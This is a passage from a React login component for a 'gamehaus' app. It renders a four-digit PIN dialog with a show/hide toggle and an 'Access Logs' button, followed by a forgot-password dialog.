                  className="absolute right-2 top-1/2 transform -translate-y-1/2 text-gamehaus-purple hover:text-gamehaus-magenta focus:outline-none"
                  aria-label={showPin ? "Hide PIN" : "Show PIN"}
                >
                  {showPin ? <EyeOff size={18} /> : <Eye size={18} />}
                </button>
              </div>
            </div>
          </div>
          <DialogFooter>
            <Button variant="outline" onClick={() => setPinDialogOpen(false)}>Cancel</Button>
            <Button 
              onClick={handlePinSubmit}
              disabled={pinInput.length !== 4}
              className="bg-gradient-to-r from-gamehaus-purple to-gamehaus-magenta hover:from-gamehaus-purple hover:to-gamehaus-magenta"
            >
              Access Logs
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      <Dialog open={forgotDialogOpen} onOpenChange={setForgotDialogOpen}>
        <DialogContent className="sm:max-w-md bg-background border-gamehaus-purple/40">
          {renderForgotPasswordContent()}
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default Login;
